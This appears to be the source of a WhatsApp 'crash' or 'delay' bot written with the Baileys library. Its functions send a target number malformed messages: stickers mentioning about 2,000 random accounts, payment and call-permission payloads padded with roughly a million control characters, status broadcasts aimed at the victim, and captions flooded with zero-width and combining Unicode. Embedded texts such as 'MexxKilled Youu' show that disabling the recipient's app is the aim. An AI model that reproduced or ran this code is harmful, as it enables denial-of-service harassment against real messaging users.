async function BulldozerXV2(target, mention) {
  console.log(chalk.red(`DelayHard Send To ${target}`));
  let parse = true;
  let SID = "5e03e0";
  let key = "10000000_2203140470115547_947412155165083119_n.enc";
  let Buffer = "01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe";
  let type = `image/webp`;
  if (11 > 9) {
    parse = parse ? false : true;
  }

  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}&mms3=true`,
          fileSha256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
          fileEncSha256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
          mediaKey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
          mimetype: type,
          directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}`,
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
          remoteJid: "X",
          participant: "0@s.whatsapp.net",
          stanzaId: "1234567890ABCDEF",
           mentionedJid: [
             "6285215587498@s.whatsapp.net",
             ...Array.from({ length: 1999 }, () =>
             `${Math.floor(100000000000 + Math.random() * 899999999999)}@s.whatsapp.net`
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: parse,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  if (mention) {
    await sock.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "" },
            content: undefined
          }
        ]
      }
    );
  }
}

async function DelayPayNew(target) {
  try {
    let payMessage = {
      interactiveMessage: {
        body: { text: "X" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: JSON.stringify({
                reference_id: null,
                payment_method: "\u0010".repeat(0x2710),
                payment_timestamp: null,
                share_payment_status: true,
              }),
            },
          ],
          messageParamsJson: "{}",
        },
      },
    };

    const msgPay = generateWAMessageFromContent(target, payMessage, {});
    await sock.relayMessage(target, msgPay.message, {
      additionalNodes: [{ tag: "biz", attrs: { native_flow_name: "payment_method" } }],
      messageId: msgPay.key.id,
      participant: { jid: target },
      userJid: target,
    });

    const msgStory = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              nativeFlowResponseMessage: {
                version: 3,
                name: "call_permission_request",
                paramsJson: "\u0000".repeat(1045000),
              },
              body: {
                text: "hi my name is mexx!!",
                format: "DEFAULT",
              },
            },
          },
        },
      },
      {
        isForwarded: false,
        ephemeralExpiration: 0,
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
        forwardingScore: 0,
        font: Math.floor(Math.random() * 9),
      }
    );

    await sock.relayMessage("status@broadcast", msgStory.message, {
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
            },
          ],
        },
      ],
      statusJidList: [target],
      messageId: msgStory.key.id,
    });

  } catch (err) {}
}

async function BetaHardDelay(sock, target) {
    let biji = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "- mexx aree youu okkyy?",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_message",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
                "#" +
                Math.floor(Math.random() * 16777215)
                    .toString(16)
                    .padStart(6, "99999999"),
        }
    );
    
    let biji2 = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "- mexx whyyy??!",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_request",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
                "#" +
                Math.floor(Math.random() * 16777215)
                    .toString(16)
                    .padStart(6, "99999999"),
        }
    );    

    await sock.relayMessage(
        "status@broadcast",
        biji.message,
        {
            messageId: biji.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );
    
    await sock.relayMessage(
        "status@broadcast",
        biji2.message,
        {
            messageId: biji2.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );    
}

async function DelayHardNew(target) {
    let permissionX = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "- MexxKilled Youu",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_message",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
                "#" +
                Math.floor(Math.random() * 16777215)
                    .toString(16)
                    .padStart(6, "99999999"),
        }
    );
    
    let permissionY = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "- MexxKilled Youu",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_request",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
               "#" +
               Math.floor(Math.random() * 16777215)
               .toString(16)
               .padStart(6, "99999999"),
        }
    );    

    await sock.relayMessage(
        "status@broadcast",
        permissionX.message,
        {
            messageId: permissionX.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );
    
    await sock.relayMessage(
        "status@broadcast",
        permissionY.message,
        {
            messageId: permissionY.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );    
}

async function HardKouta(target) {
  try {
    const locationMemex = {
      templateMessage: {
        hydratedTemplate: {
          hydratedContentText: "\u200B".repeat(50000) + "𑜦𑜠".repeat(5000) + "ꦽ".repeat(5000) + "ꦾ".repeat(5000) + "ោ៝".repeat(5000),
          hydratedFooterText: "",
          locationMessage: {
            degreesLatitude: -6.2088,
            degreesLongitude: 106.8456,
            name: "",
            address: ""
          },
          hydratedButtons: [
            {
              index: 1,
              urlButton: {
                displayText: "\u200B".repeat(50000) + "𑜦𑜠".repeat(5000) + "ꦽ".repeat(5000) + "ꦾ".repeat(5000) + "ោ៝".repeat(5000),
                url: "https://www.google.com/maps?q=-6.2088,106.8456"
              }
            }
          ]
        }
      }
    };

    const msgLoc = generateWAMessageFromContent(target, locationMemex, {});
    await sock.relayMessage(target, msgLoc.message, { messageId: msgLoc.key.id });

    const images = [
      "https://files.catbox.moe/9x3f0p.jpg",
      "https://files.catbox.moe/jd4y8t.jpg",
      "https://files.catbox.moe/qn3j8l.jpg",
      "https://files.catbox.moe/5m1x6h.jpg",
      "https://files.catbox.moe/2j9nzg.jpg",
      "https://files.catbox.moe/9x3f0p.jpg",
      "https://files.catbox.moe/jd4y8t.jpg",
      "https://files.catbox.moe/qn3j8l.jpg",
      "https://files.catbox.moe/5m1x6h.jpg",
      "https://files.catbox.moe/2j9nzg.jpg",
      "https://files.catbox.moe/9x3f0p.jpg",
      "https://files.catbox.moe/jd4y8t.jpg",
      "https://files.catbox.moe/qn3j8l.jpg",
      "https://files.catbox.moe/5m1x6h.jpg",
      "https://files.catbox.moe/2j9nzg.jpg",
      "https://files.catbox.moe/9x3f0p.jpg",
      "https://files.catbox.moe/jd4y8t.jpg",
      "https://files.catbox.moe/qn3j8l.jpg",
      "https://files.catbox.moe/5m1x6h.jpg",
      "https://files.catbox.moe/2j9nzg.jpg",
      "https://files.catbox.moe/9x3f0p.jpg",
      "https://files.catbox.moe/jd4y8t.jpg",
      "https://files.catbox.moe/qn3j8l.jpg",
      "https://files.catbox.moe/5m1x6h.jpg",
      "https://files.catbox.moe/2j9nzg.jpg"
    ];

    for (const [i, url] of images.entries()) {
      await sock.sendMessage(
        target,
        {
          image: { url },
          caption: "\u200B".repeat(50000) + "𑜦𑜠".repeat(5000) + "ꦽ".repeat(5000) + "ꦾ".repeat(5000) + "ោ៝".repeat(5000)
        }
      );
    }

  } catch (err) {
  }
}
